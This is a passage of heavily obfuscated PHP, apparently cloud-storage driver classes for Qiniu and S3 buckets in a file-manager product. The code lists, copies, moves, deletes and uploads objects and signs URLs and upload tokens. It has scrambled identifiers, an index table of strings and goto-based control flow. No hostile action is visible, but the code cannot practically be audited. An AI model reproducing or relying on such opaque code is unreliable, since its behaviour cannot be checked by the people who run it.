$d‡ÓÆÕøÑ[8]) . $d‡ÓÆÕøÑ[8], $d‡ÓÆÕøÑ[1167] => 1, $d‡ÓÆÕøÑ[1168] => $d‡ÓÆÕøÑ[33]); $Eˆ¥àó²Òæ = $this->client->listObjects($this->bucket, $b±âÜºï®÷); if ($Eˆ¥àó²Òæ->getObjectList() || $Eˆ¥àó²Òæ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($b¾ŒÖ”Ú) { parent::__construct(); require_once SDK_DIR . $_SERVER[¼][1197]; $this->_init($b¾ŒÖ”Ú); } public function _init($Fƒ·Áã›ÚÌ) { foreach ($Fƒ·Áã›ÚÌ as $A¼ë÷Ç›® => $EĞòÚ¼ï”) { if (isset($this->{$A¼ë÷Ç›®})) { $this->{$A¼ë÷Ç›®} = $EĞòÚ¼ï”; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¼][1198], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Fî¦’˜•Ôø, $Cùˆ‘ÃùØ… = '', $d›ÕåÎÅãÅ = REPEAT_RENAME) { if ($this->setContent($Fî¦’˜•Ôø, $Cùˆ‘ÃùØ…)) { return $this->getPathOuter($Fî¦’˜•Ôø); } return !1; } public function mkdir($D«¢ò´ïò¸, $D“Âù­©Ñ“ = REPEAT_SKIP) { goto b©ôõ˜‘è¶; b©ôõ˜‘è¶: $bÅ•ÈÂÃò =& $_SERVER[¼]; $D÷ ¸ÍƒÔ— = trim($D«¢ò´ïò¸, $bÅ•ÈÂÃò[8]); if ($this->_isFolder($D÷ ¸ÍƒÔ—)) { return $this->getPathOuter($D÷ ¸ÍƒÔ—); } goto aš½‡¼óé; aš½‡¼óé: $D«¢ò´ïò¸ = $D÷ ¸ÍƒÔ— . $bÅ•ÈÂÃò[8]; $cæö¡­î‡Œ = get_path_this($D÷ ¸ÍƒÔ—); $AœËê„İÀÚ = $D«¢ò´ïò¸ . $cæö¡­î‡Œ; goto e³©—ŠÓÓÜ; e³©—ŠÓÓÜ: if (!$this->mkfile($AœËê„İÀÚ)) { return !1; } if (!$this->moveFile($AœËê„İÀÚ, $D«¢ò´ïò¸)) { $this->delFile($AœËê„İÀÚ); return !1; } return $this->getPathOuter($D÷ ¸ÍƒÔ—); goto dí¸³óØ‹; dí¸³óØ‹: } public function copyFile($BíŞªÛ¥ßê, $D—Œç—Ğ­Á) { $a¯¹‚®¹—‚ = $this->bucketManager->copy($this->bucket, $BíŞªÛ¥ßê, $this->bucket, $D—Œç—Ğ­Á, !0); return $a¯¹‚®¹—‚ ? !1 : !0; } public function moveFile($a‰É µ¡£, $aâø£íÍ¤¼) { $aÈ Æîè†À = $this->bucketManager->move($this->bucket, $a‰É µ¡£, $this->bucket, $aâø£íÍ¤¼, !0); return $aÈ Æîè†À ? !1 : !0; } public function delFile($eÒ¤ˆÛ®¿¼) { $B¯¬ã‘Àòí = $this->bucketManager->delete($this->bucket, $eÒ¤ˆÛ®¿¼); return $B¯¬ã‘Àòí ? !1 : !0; } public function delFolder($FñË‡Ê…¥) { $EÍ²“©§çÌ = $this->fileList($FñË‡Ê…¥); if (empty($EÍ²“©§çÌ)) { return !0; } $DË×˜‚Ì÷Ü = 1000; if (count($EÍ²“©§çÌ) <= $DË×˜‚Ì÷Ü) { return $this->qnDelObj($EÍ²“©§çÌ) ? !1 : !0; } foreach (array_chunk($EÍ²“©§çÌ, $DË×˜‚Ì÷Ü) as $fÏêó™ö‡Õ) { $DÀÚÃ›ºÃ× = $this->qnDelObj($fÏêó™ö‡Õ); if ($DÀÚÃ›ºÃ×) { return !1; } } return !0; } private function qnDelObj($A¦ÅÌÀíÛ) { $cÎÙáŠïóË = $this->bucketManager->buildBatchDelete($this->bucket, $A¦ÅÌÀíÛ); list($Dƒ‹“„ì“ˆ, $F¥ùÔá›‘º) = $this->bucketManager->batch($cÎÙáŠïóË); return $F¥ùÔá›‘º; } private function fileList($B¼ôƒ¼Ô‡, $fÉœº‚óŠ = 0) { goto F”Ç›×è´²; F”Ç›×è´²: $A¯ËÎ‚åã =& $_SERVER[¼]; $B¼ôƒ¼Ô‡ = trim($B¼ôƒ¼Ô‡, $A¯ËÎ‚åã[8]); $fÓ‚É²æö = empty($B¼ôƒ¼Ô‡) ? $A¯ËÎ‚åã[33] : $B¼ôƒ¼Ô‡ . $A¯ËÎ‚åã[8]; goto eµğ·ñÏ¿¢; eµğ·ñÏ¿¢: $D×²ÔÑ²Ò² = $A¯ËÎ‚åã[33]; $c½á¡Ñ‹…¡ = 1000; $B°¨Ÿº½â– = $A¯ËÎ‚åã[33]; goto C„½ùÒã‘†; C„½ùÒã‘†: $Bê«ĞßØ½ª = array(); while (!0) { list($C¶ÏªÔî¨Ö, $AõÖÖÇº²™) = $this->bucketManager->listFiles($this->bucket, $fÓ‚É²æö, $D×²ÔÑ²Ò², $c½á¡Ñ‹…¡, $B°¨Ÿº½â–); if ($AõÖÖÇº²™) { return !1; } $D×²ÔÑ²Ò² = array_key_exists($A¯ËÎ‚åã[1168], $C¶ÏªÔî¨Ö) ? $D×²ÔÑ²Ò² = $C¶ÏªÔî¨Ö[$A¯ËÎ‚åã[1199]] : $A¯ËÎ‚åã[33]; foreach ($C¶ÏªÔî¨Ö[$A¯ËÎ‚åã[1200]] as $Cã§Â¨´) { $FäèÇÑá™® = $Cã§Â¨´[$A¯ËÎ‚åã[89]]; if ($fÉœº‚óŠ) { $FäèÇÑá™® = array($A¯ËÎ‚åã[28] => $FäèÇÑá™®, $A¯ËÎ‚åã[77] => $Cã§Â¨´[$A¯ËÎ‚åã[1201]]); } $Bê«ĞßØ½ª[] = $FäèÇÑá™®; } if ($D×²ÔÑ²Ò² == $A¯ËÎ‚åã[33]) { break; } } return $Bê«ĞßØ½ª; goto EéºÁŒ°Ù¸; EéºÁŒ°Ù¸: } public function rename($EÂ†“‰Æ”˜, $Aµ‡¼Ö ½) { return $this->renameObject($EÂ†“‰Æ”˜, $Aµ‡¼Ö ½); } public function fileInfo($b¬µØãó†…, $CØÈéïÍ¤ = false, $cê’˜”í÷† = array()) { goto Eª…ŞÚÑÌĞ; Eª…ŞÚÑÌĞ: $F°¤Òø =& $_SERVER[¼]; if ($CØÈéïÍ¤) { return array($F°¤Òø[28] => $this->pathThis($b¬µØãó†…), $F°¤Òø[75] => $this->getPathOuter($F°¤Òø[8] . $b¬µØãó†…), $F°¤Òø[29] => $F°¤Òø[164], $F°¤Òø[77] => isset($cê’˜”í÷†[$F°¤Òø[1201]]) ? $cê’˜”í÷†[$F°¤Òø[1201]] : 0, $F°¤Òø[157] => $this->ext($b¬µØãó†…)); } $a†¿„†¿Ğ = array($F°¤Òø[28] => $this->pathThis($b¬µØãó†…), $F°¤Òø[75] => $this->getPathOuter($F°¤Òø[8] . $b¬µØãó†…), $F°¤Òø[29] => $F°¤Òø[164], $F°¤Òø[184] => 0, $F°¤Òø[107] => 0, $F°¤Òø[77] => 0, $F°¤Òø[157] => $this->ext($b¬µØãó†…), $F°¤Òø[185] => !0, $F°¤Òø[186] => !0); goto cé´ÎŞóøÕ; EÚ¶†™â‚: return $a†¿„†¿Ğ; goto dÔ¸´êßñÅ; cé´ÎŞóøÕ: if (empty($cê’˜”í÷†)) { $cê’˜”í÷† = $this->objectMeta($b¬µØãó†…); if (!$cê’˜”í÷†) { return $a†¿„†¿Ğ; } } if (isset($cê’˜”í÷†[$F°¤Òø[1202]])) { $a†¿„†¿Ğ[$F°¤Òø[184]] = $cê’˜”í÷†[$F°¤Òø[1202]]; } if (isset($cê’˜”í÷†[$F°¤Òø[1201]])) { $a†¿„†¿Ğ[$F°¤Òø[77]] = $cê’˜”í÷†[$F°¤Òø[1201]]; } goto EÚ¶†™â‚; dÔ¸´êßñÅ: } public function folderInfo($E¾‡ª…‘—, $fÀ½÷ƒî¸ = false) { goto cê„¼Œ«æ°; Cò”¯ÆÕ: $E¾‡ª…‘— = rtrim($E¾‡ª…‘—, $cìä³×¥²Ö[8]) . $cìä³×¥²Ö[8]; $cÆÃˆ÷˜í = $this->objectMeta($E¾‡ª…‘—); if (isset($cÆÃˆ÷˜í[$cìä³×¥²Ö[1202]])) { $AäîØ¸ãß[$cìä³×¥²Ö[184]] = $cÆÃˆ÷˜í[$cìä³×¥²Ö[1202]]; } goto A³‡Ç¯½Ğ£; A³‡Ç¯½Ğ£: return $AäîØ¸ãß; goto eœ‡÷Ê”Ú÷; cê„¼Œ«æ°: $cìä³×¥²Ö =& $_SERVER[¼]; if ($fÀ½÷ƒî¸) { return array($cìä³×¥²Ö[28] => $this->pathThis($E¾‡ª…‘—), $cìä³×¥²Ö[75] => $this->getPathOuter($cìä³×¥²Ö[8] . $E¾‡ª…‘—), $cìä³×¥²Ö[29] => $cìä³×¥²Ö[76]); } $AäîØ¸ãß = array($cìä³×¥²Ö[28] => $this->pathThis($E¾‡ª…‘—), $cìä³×¥²Ö[75] => $this->getPathOuter($cìä³×¥²Ö[8] . $E¾‡ª…‘—), $cìä³×¥²Ö[29] => $cìä³×¥²Ö[76], $cìä³×¥²Ö[184] => 0, $cìä³×¥²Ö[107] => 0, $cìä³×¥²Ö[1147] => !0, $cìä³×¥²Ö[1148] => !0); goto Cò”¯ÆÕ; eœ‡÷Ê”Ú÷: } public function listPath($BÊÊ„‹ŠÄ, $A…›“…Êäù = false) { goto bÀŒ…ºÑÊº; a¶ÑŒï¸ÇË: $AäÍàğÃŠ = $fŒæ¢±¾«Ç = array(); while (!0) { list($f•™À’º Ó, $Eá‹°“›‚Á) = $this->bucketManager->listFiles($this->bucket, $BìƒíÖ®…, $aÔ¿É‚¨’´, $CæïÒ¼İ„, $BÓ¶Û¢ê†ë); if ($Eá‹°“›‚Á) { return !1; } $aÔ¿É‚¨’´ = array_key_exists($aÎíöƒÑ ë[1168], $f•™À’º Ó) ? $aÔ¿É‚¨’´ = $f•™À’º Ó[$aÎíöƒÑ ë[1199]] : $aÎíöƒÑ ë[33]; if (isset($f•™À’º Ó[$aÎíöƒÑ ë[1203]])) { foreach ($f•™À’º Ó[$aÎíöƒÑ ë[1203]] as $B¾œî³ƒö•) { if ($B¾œî³ƒö• == $BìƒíÖ®…) { continue; } $AäÍàğÃŠ[] = $this->folderInfo($B¾œî³ƒö•, $A…›“…Êäù); } } if (isset($f•™À’º Ó[$aÎíöƒÑ ë[1200]])) { foreach ($f•™À’º Ó[$aÎíöƒÑ ë[1200]] as $BÂ“‚Ó§ïë) { if ($BÂ“‚Ó§ïë[$aÎíöƒÑ ë[89]] == $BìƒíÖ®…) { continue; } $fŒæ¢±¾«Ç[] = $this->fileInfo($BÂ“‚Ó§ïë[$aÎíöƒÑ ë[89]], $A…›“…Êäù, $BÂ“‚Ó§ïë); } } if ($aÔ¿É‚¨’´ == $aÎíöƒÑ ë[33]) { break; } } return array($aÎíöƒÑ ë[74] => $AäÍàğÃŠ, $aÎíöƒÑ ë[73] => $fŒæ¢±¾«Ç); goto BØÒÒäèÌÁ; bÀŒ…ºÑÊº: $aÎíöƒÑ ë =& $_SERVER[¼]; $BÊÊ„‹ŠÄ = trim($BÊÊ„‹ŠÄ, $aÎíöƒÑ ë[8]); $BìƒíÖ®… = empty($BÊÊ„‹ŠÄ) ? $aÎíöƒÑ ë[33] : $BÊÊ„‹ŠÄ . $aÎíöƒÑ ë[8]; goto Aãä÷ÓİÀ; Aãä÷ÓİÀ: $aÔ¿É‚¨’´ = $aÎíöƒÑ ë[33]; $CæïÒ¼İ„ = 1000; $BÓ¶Û¢ê†ë = $aÎíöƒÑ ë[8]; goto a¶ÑŒï¸ÇË; BØÒÒäèÌÁ: } public function has($Dˆğ‚¤Œ¢¨, $a®÷†””Î» = false, $ešéãïï½‹ = true) { goto f£Ìƒ·†‘…; fĞÁ®ï¦Ÿ…: $AÛÍŒ‘¬±Î = $Bµ¢«ãå”ˆ[33]; $Fêà”©££ï = 1000; $A°¢¢’ÌãĞ = $Bµ¢«ãå”ˆ[8]; goto CÔ¤œ—˜¿á; F«ª¤£‡ßŒ: if ($a®÷†””Î») { return array($Bµ¢«ãå”ˆ[188] => $c³°¦‹ºù, $Bµ¢«ãå”ˆ[189] => $d„•¼èç™É); } return !1; goto DÌ‹¼ÇŞ¥ä; f£Ìƒ·†‘…: $Bµ¢«ãå”ˆ =& $_SERVER[¼]; $Dˆğ‚¤Œ¢¨ = trim($Dˆğ‚¤Œ¢¨, $Bµ¢«ãå”ˆ[8]); $D‘å„‡æ¬¡ = empty($Dˆğ‚¤Œ¢¨) ? $Bµ¢«ãå”ˆ[33] : $Dˆğ‚¤Œ¢¨ . $Bµ¢«ãå”ˆ[8]; goto fĞÁ®ï¦Ÿ…; CÔ¤œ—˜¿á: $c³°¦‹ºù = 0; $d„•¼èç™É = 0; while (!0) { list($aê ºÁ¶ç, $AÃˆ¿™ñ÷‡) = $this->bucketManager->listFiles($this->bucket, $D‘å„‡æ¬¡, $AÛÍŒ‘¬±Î, $Fêà”©££ï, $A°¢¢’ÌãĞ); if ($AÃˆ¿™ñ÷‡) { return !1; } $AÛÍŒ‘¬±Î = array_key_exists($Bµ¢«ãå”ˆ[1168], $aê ºÁ¶ç) ? $AÛÍŒ‘¬±Î = $aê ºÁ¶ç[$Bµ¢«ãå”ˆ[1199]] : $Bµ¢«ãå”ˆ[33]; if ($a®÷†””Î») { if (!empty($aê ºÁ¶ç[$Bµ¢«ãå”ˆ[1200]])) { $c³°¦‹ºù += count($aê ºÁ¶ç[$Bµ¢«ãå”ˆ[1200]]); } if (!empty($aê ºÁ¶ç[$Bµ¢«ãå”ˆ[1203]])) { $d„•¼èç™É += count($aê ºÁ¶ç[$Bµ¢«ãå”ˆ[1203]]); } if ($AÛÍŒ‘¬±Î === $Bµ¢«ãå”ˆ[33]) { break; } continue; } if ($ešéãïï½‹) { if (!empty($aê ºÁ¶ç[$Bµ¢«ãå”ˆ[1200]])) { return !0; } } else { if (!empty($aê ºÁ¶ç[$Bµ¢«ãå”ˆ[1203]])) { return !0; } } if ($AÛÍŒ‘¬±Î == $Bµ¢«ãå”ˆ[33]) { break; } } goto F«ª¤£‡ßŒ; DÌ‹¼ÇŞ¥ä: } public function listAll($ešñ«¿¨‡) { $dùŠÂí§† =& $_SERVER[¼]; $d’Ã¢â­ñ´ = $this->fileList($ešñ«¿¨‡, 1); $d›Õ‰“ºöÅ = array(); foreach ($d’Ã¢â­ñ´ as $AëæĞ‘¦ŸÍ) { $d›Õ‰“ºöÅ[$AëæĞ‘¦ŸÍ[$dùŠÂí§†[28]]] = $AëæĞ‘¦ŸÍ[$dùŠÂí§†[77]]; } return $this->listAllFiles($ešñ«¿¨‡, array_keys($d›Õ‰“ºöÅ), $d›Õ‰“ºöÅ); } public function canRead($AğÌ¢Èğ¯Ø) { return $this->exist($AğÌ¢Èğ¯Ø) ? !0 : !1; } public function canWrite($d®œƒãáÛÙ) { return $this->exist($d®œƒãáÛÙ) ? !0 : !1; } public function getContent($dîÅêÊÃ”‹) { return $this->fileSubstr($dîÅêÊÃ”‹, 0, -1); } public function setContent($FÒ¨‚”‚¥–, $EÑÎä·áÃ– = '') { $D¥ÈƒñƒÌì = $this->tempFile($this->pathThis($FÒ¨‚”‚¥–)); file_put_contents($D¥ÈƒñƒÌì, $EÑÎä·áÃ–); if ($this->upload($FÒ¨‚”‚¥–, $D¥ÈƒñƒÌì)) { $this->tempFileRemve($D¥ÈƒñƒÌì); return !0; } return !1; } public function refreshUrls($a¢ëÈ­õĞæ) { goto CŠ«ÕôåÄè; AßšŠ¦è…’: return $Fà¨¦‹‹ïÀ[$EãäÅÁæä‹[1204]] == $EãäÅÁæä‹[688] ? !0 : !1; goto FÜÙ™âùµÎ; CŠ«ÕôåÄè: $EãäÅÁæä‹ =& $_SERVER[¼]; $aù·÷­õâÛ = array(); if (is_array($a¢ëÈ­õĞæ)) { foreach ($a¢ëÈ­õĞæ as $BÚÁ’­ÀáÉ) { $aù·÷­õâÛ[] = $this->link($BÚÁ’­ÀáÉ); } } else { $aù·÷­õâÛ[] = $this->link($a¢ëÈ­õĞæ); } goto a†¯„”Åµå; a†¯„”Åµå: $C¼çöê’½Æ = new Qiniu\Cdn\CdnManager($this->auth); list($Fà¨¦‹‹ïÀ, $d£„ï³Ó®) = $C¼çöê’½Æ->refreshUrls($aù·÷­õâÛ); if ($d£„ï³Ó®) { return !1; } goto AßšŠ¦è…’; FÜÙ™âùµÎ: } public function fileSubstr($d‡¹†Ø«ùÄ, $BŠ·°„¢£‰, $Eó¾Áâµ) { $a–õË§©‚³ =& $_SERVER[¼]; if (!($Bøö¼¼» = $this->link($d‡¹†Ø«ùÄ))) { return !1; } $dç¿ñ¯é©Í = !1; if ($Eó¾Áâµ > 0) { $fêºÄœµ•Ó = $BŠ·°„¢£‰ + $Eó¾Áâµ - 1; $dç¿ñ¯é©Í = array($a–õË§©‚³[1205] . $BŠ·°„¢£‰ . $a–õË§©‚³[408] . $fêºÄœµ•Ó); } $fè™ßôæ¬Ä = url_request($Bøö¼¼», $a–õË§©‚³[213], !1, $dç¿ñ¯é©Í); return $fè™ßôæ¬Ä[$a–õË§©‚³[681]] ? $fè™ßôæ¬Ä[$a–õË§©‚³[1027]] : !1; } public function upload($BË‹¦í‘˜Õ, $Cóùƒ÷÷³, $e–êäÚ¿‰Û = false, $fÇ­í¨Ë¸Œ = REPEAT_REPLACE) { $B¥ÁÕè™©‡ = new Qiniu\Storage\UploadManager(); $BÉŞÇŠÈµÑ = $this->auth->uploadToken($this->bucket, $BË‹¦í‘˜Õ); $d‰šÌ¶¢©Ö = get_file_mime(get_path_ext($Cóùƒ÷÷³)); list($c©áªÀÌ, $d’Ã¾ñØ) = $B¥ÁÕè™©‡->putFile($BÉŞÇŠÈµÑ, $BË‹¦í‘˜Õ, $Cóùƒ÷÷³, null, $d‰šÌ¶¢©Ö); return $d’Ã¾ñØ ? !1 : $this->getPathOuter($BË‹¦í‘˜Õ); } public function uploadFormData($dî™ñäè‹‹, $DÛ‰Ÿê° = 3600) { return $this->uploadToken($dî™ñäè‹‹, $DÛ‰Ÿê°); } public function multiUploadFormData($Eç²ë¾ë¦”, $Fµâëœ¦ÓÃ = 3600) { return $this->uploadToken($Eç²ë¾ë¦”, $Fµâëœ¦ÓÃ); } private function uploadToken($DïÓŸˆğŒ, $B ¥ê³×–­ = 3600) { goto fóŒæº¿Ï–; fóŒæº¿Ï–: $F›¯š‚Óƒ =& $_SERVER[¼]; $c ÂÑñ÷ÀÍ = $B ¥ê³×–­; $AÈòéØ“  = array($F›¯š‚Óƒ[1206] => $F›¯š‚Óƒ[1207]); goto AÖ×Å‚‚’â; e•¦¾„İ: $AÅÔ¾ÓÈ¤¡ = http_type() . "\72\x2f\57\x75\160\x6c\x6f\141\144{$d·ïÂùŠïš}\56\161\x69\x6e\x69\x75\160\x2e\x63\x6f\x6d\x2f"; return array($F›¯š‚Óƒ[1209] => $e¥¾Â¯§ÃÁ, $F›¯š‚Óƒ[1210] => $AÅÔ¾ÓÈ¤¡); goto Eä¹õ¿ØÊÑ; AÖ×Å‚‚’â: $c§¦øÒ‡öÇ = null; $e¥¾Â¯§ÃÁ = $this->auth->uploadToken($this->bucket, $c§¦øÒ‡öÇ, $c ÂÑñ÷ÀÍ, $AÈòéØ“ , !0); $d·ïÂùŠïš = empty($this->region) || $this->region == $F›¯š‚Óƒ[1208] ? $F›¯š‚Óƒ[33] : $F›¯š‚Óƒ[408] . $this->region; goto e•¦¾„İ; Eä¹õ¿ØÊÑ: } public function download($bÄª†ÜÚ”, $c»òÄøÒé) { goto DÇÀ¬­À…Ï; B‹ÕÎŞŠí‘: fclose($Aëñ‚–Ü‰); return $c»òÄøÒé; goto DÀ¢ğ¢‘ƒ; fÊâ“¯Ã¦½: $cÒ…ÜÔ†¤ = 1024 * 200; $Aëñ‚–Ü‰ = fopen($fêÅ¨Ÿ»ñù, $_SERVER[¼][1211]); while (!0) { $c¥øÀä§´å = $this->fileSubstr($bÄª†ÜÚ”, $däÈÀÆÕ»ç, $cÒ…ÜÔ†¤); if ($c¥øÀä§´å === !1) { return !1; } fwrite($Aëñ‚–Ü‰, $c¥øÀä§´å); $däÈÀÆÕ»ç += $cÒ…ÜÔ†¤; if (strlen($c¥øÀä§´å) < $cÒ…ÜÔ†¤) { break; } } goto B‹ÕÎŞŠí‘; DÇÀ¬­À…Ï: $fêÅ¨Ÿ»ñù = IO::getPathInner(IO::mkfile($c»òÄøÒé)); if (!($DŞŞ£ßÀ„ê = $this->link($bÄª†ÜÚ”))) { return !1; } $däÈÀÆÕ»ç = 0; goto fÊâ“¯Ã¦½; DÀ¢ğ¢‘ƒ: } public function link($bôÂâåó‘, $déƒè„³ËË = '') { if (!$this->isFile($bôÂâåó‘)) { return !1; } $F¡ß¸ƒğŸ = $this->getHost() . $_SERVER[¼][8] . $this->pathEncode($bôÂâåó‘) . $déƒè„³ËË; return $this->auth->privateDownloadUrl($F¡ß¸ƒğŸ, 3600 * 12); } public function fileOut($Få——ÚÅø¿, $AËÈÄŒÅ¼ = false, $FÂ‚®Ì²Ì„ = false, $e­…·Ô¨Úà = '') { $Eö’š•‘Å• =& $_SERVER[¼]; if (!$FÂ‚®Ì²Ì„) { $FÂ‚®Ì²Ì„ = $this->pathThis($Få——ÚÅø¿); } $DÈ±Êñç¤ = $AËÈÄŒÅ¼ ? $Eö’š•‘Å•[1212] . rawurlencode($FÂ‚®Ì²Ì„) : $Eö’š•‘Å•[33]; $DœÒ³¶âÃß = $this->link($Få——ÚÅø¿, $DÈ±Êñç¤); $this->fileOutLink($DœÒ³¶âÃß); } public function fileOutServer($céêÎõôÕ, $D•¤ÃäÇ´Ö = false, $C‘”ùãéŸé = false, $aáÑø ã¥ã = '') { parent::fileOut($céêÎõôÕ, $D•¤ÃäÇ´Ö, $C‘”ùãéŸé, $aáÑø ã¥ã); } public function fileOutImage($C›©å²«¯Á, $CÅ¹áääêğ = 250) { $e±ÃÙ¯ù¡ = $this->link($C›©å²«¯Á, $_SERVER[¼][1213] . $CÅ¹áääêğ); $this->fileOutLink($e±ÃÙ¯ù¡); } public function fileOutImageServer($fä©¿®”¶­, $aÌ¢¬°…äÔ = 250) { parent::fileOutImage($fä©¿®”¶­, $aÌ¢¬°…äÔ); } public function hashMd5($Cäˆˆ…”) { $CÕÉ—ø“Ï =& $_SERVER[¼]; $F¦İ…¹¦Çô = $this->objectMeta($Cäˆˆ…”); return isset($F¦İ…¹¦Çô[$CÕÉ—ø“Ï[193]]) ? $F¦İ…¹¦Çô[$CÕÉ—ø“Ï[193]] : !1; $d¾‚ĞÇÈŠ‘ = $this->link($Cäˆˆ…”, $CÕÉ—ø“Ï[1214]); } public function size($D’…íÓ…æ°) { $B³¿ä¬ÒàÌ = $this->objectMeta($D’…íÓ…æ°); return $B³¿ä¬ÒàÌ ? $B³¿ä¬ÒàÌ[$_SERVER[¼][77]] : 0; } public function info($A‰İö‚½Î) { if ($this->isFolder($A‰İö‚½Î)) { return $this->folderInfo($A‰İö‚½Î); } else { if ($this->isFile($A‰İö‚½Î)) { return $this->fileInfo($A‰İö‚½Î); } } return !1; } public function exist($AíÂµ…ÜØ) { return $this->isFile($AíÂµ…ÜØ) || $this->isFolder($AíÂµ…ÜØ); } public function isFile($b­ˆÔìƒ¾À) { return !$this->isFolder($b­ˆÔìƒ¾À) && $this->objectMeta($b­ˆÔìƒ¾À); } public function isFolder($C§š±–®ù„) { return $this->cacheMethod($_SERVER[¼][220], $C§š±–®ù„); } protected function objectMeta($FãÙ©«Ô) { return $this->cacheMethod($_SERVER[¼][221], $FãÙ©«Ô); } protected function _objectMeta($fº®šš…) { $c‰†ëôŠ…¹ =& $_SERVER[¼]; list($fôã×ËÓ‡ô, $D§Ó×›“) = $this->bucketManager->stat($this->bucket, $fº®šš…); if ($fôã×ËÓ‡ô) { $fôã×ËÓ‡ô[$c‰†ëôŠ…¹[77]] = intval($fôã×ËÓ‡ô[$c‰†ëôŠ…¹[1201]]); } return $fôã×ËÓ‡ô; } protected function _isFolder($EŒÊÄ¶ÜÚ) { $a«¥×–­¤ =& $_SERVER[¼]; list($B ö„è«É, $A÷å†¦Ÿ†Ô) = $this->bucketManager->listFiles($this->bucket, trim($EŒÊÄ¶ÜÚ, $a«¥×–­¤[8]) . $a«¥×–­¤[8], $a«¥×–­¤[33], 1, $a«¥×–­¤[8]); return !empty($B ö„è«É[$a«¥×–­¤[1200]]) || !empty($B ö„è«É[$a«¥×–­¤[1203]]) ? !0 : !1; } } goto Eªî‹ƒƒŒ‚; Eªî‹ƒƒŒ‚: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($f†éÆšäª) { parent::__construct($f†éÆšäª); } public function uploadFormData($dÙ‡«ÔİÛ, $BÔ„’ª½Äí = 3600) { goto eÄ÷Ñ©éÇ; f¢äÕ…Äâˆ: $aìƒ°àÓêØ = hash_hmac($Aß’ ±—ò£[1129], $Aó˜Š¸êÚ, $d‹âÅ¡í§ï, !0); $d‘çÑâšÃ… = hash_hmac($Aß’ ±—ò£[1129], $C’Í”âô, $aìƒ°àÓêØ, !0); $D•ÆÛ»“Åâ = hash_hmac($Aß’ ±—ò£[1129], $Cí¨©Œğ‘, $d‘çÑâšÃ…); goto BÕ…À‹¸‘Œ; BÕ…À‹¸‘Œ: $D—Ëˆˆ…¹ = array($Aß’ ±—ò£[196] => $Aß’ ±—ò£[33], $Aß’ ±—ò£[1131] => $Aß’ ±—ò£[33], $Aß’ ±—ò£[1090] => $F¨£Æ ´Ô, $Aß’ ±—ò£[1094] => $Bš½ÁØ, $Aß’ ±—ò£[1098] => $Cí¨©Œğ‘, $Aß’ ±—ò£[1132] => $B¿¡Óƒƒ˜è, $Aß’ ±—ò£[1133] => $E¢•ßçÆ¼, $Aß’ ±—ò£[1134] => $d‰–•ÀÜŒÑ, $Aß’ ±—ò£[1135] => $a°¥Ó‹º§Ä, $Aß’ ±—ò£[1136] => $D•ÆÛ»“Åâ, $Aß’ ±—ò£[166] => $this->getHost()); return $D—Ëˆˆ…¹; goto A„ˆÒ§íŸˆ; FÒ„æ¬‹Â: $Aó˜Š¸êÚ = $Aß’ ±—ò£[59]; $d‰–•ÀÜŒÑ = gmdate($Aß’ ±—ò£[1120]); $a‰Ú³Ä· = gmdate($Aß’ ±—ò£[682]); goto EìˆŠÉã¾; cÖ†Ñ­ìğ‡: $Cí¨©Œğ‘ = base64_encode(json_encode($fÄÆÀç‘Øª)); $a³È‡šÎìí = hash_hmac($Aß’ ±—ò£[1129], $a‰Ú³Ä·, $Aß’ ±—ò£[1130] . $this->secret, !0); $d‹âÅ¡í§ï = hash_hmac($Aß’ ±—ò£[1129], $this->region, $a³È‡šÎìí, !0); goto f¢äÕ…Äâˆ; EìˆŠÉã¾: $C’Í”âô = $Aß’ ±—ò£[1121]; $a°¥Ó‹º§Ä = $BÔ„’ª½Äí . $Aß’ ±—ò£[33]; $Bš½ÁØ = $Aß’ ±—ò£[1086]; goto fõİ¯Ü­Ê‚; fõİ¯Ü­Ê‚: $b¯……À¤Úé = array($this->accessKey, $a‰Ú³Ä·, $this->region, $Aó˜Š¸êÚ, $C’Í”âô); $B¿¡Óƒƒ˜è = implode($Aß’ ±—ò£[8], $b¯……À¤Úé); $fÄÆÀç‘Øª = array($Aß’ ±—ò£[1088] => gmdate($Aß’ ±—ò£[1087], strtotime($Aß’ ±—ò£[1122])), $Aß’ ±—ò£[1089] => array(array($Aß’ ±—ò£[1091] => $this->bucket), array($Aß’ ±—ò£[1090] => $F¨£Æ ´Ô), array($Aß’ ±—ò£[1092], $Aß’ ±—ò£[1093], $Aß’ ±—ò£[33]), array($Aß’ ±—ò£[1092], $Aß’ ±—ò£[1123], $Aß’ ±—ò£[33]), array($Aß’ ±—ò£[1092], $Aß’ ±—ò£[1124], $Aß’ ±—ò£[33]), array($Aß’ ±—ò£[1094] => $Bš½ÁØ), array($Aß’ ±—ò£[1125] => $B¿¡Óƒƒ˜è), array($Aß’ ±—ò£[1126] => $E¢•ßçÆ¼), array($Aß’ ±—ò£[1127] => $d‰–•ÀÜŒÑ), array($Aß’ ±—ò£[1128] => $a°¥Ó‹º§Ä))); goto cÖ†Ñ­ìğ‡; eÄ÷Ñ©éÇ: $Aß’ ±—ò£ =& $_SERVER[¼]; $F¨£Æ ´Ô = $Aß’ ±—ò£[182]; $E¢•ßçÆ¼ = $Aß’ ±—ò£[1119]; goto FÒ„æ¬‹Â; A„ˆÒ§íŸˆ: } public function multiUploadFormData($E¿Ëë†ÀÔ©, $EÂ¸Ò†õ¹± = 3600) { $b±Úà¹‡¨ =& $_SERVER[¼]; $A‘¶ÆÇ‡ï = gmdate($b±Úà¹‡¨[1215]); $b‡æ¯ÎÉ… = array(); $FÄÓù•°‡¤ = $this->client->getUploadId($this->bucket, $E¿Ëë†ÀÔ©, $b‡æ¯ÎÉ…); if (!$FÄÓù•°‡¤) { return !1; } return array($b±Úà¹‡¨[206] => $FÄÓù•°‡¤, $b±Úà¹‡¨[166] => $this->getHost() . $b±Úà¹‡¨[8] . $this->pathEncode($E¿Ëë†ÀÔ©), $b±Úà¹‡¨[207] => $A‘¶ÆÇ‡ï, $b±Úà¹‡¨[89] => 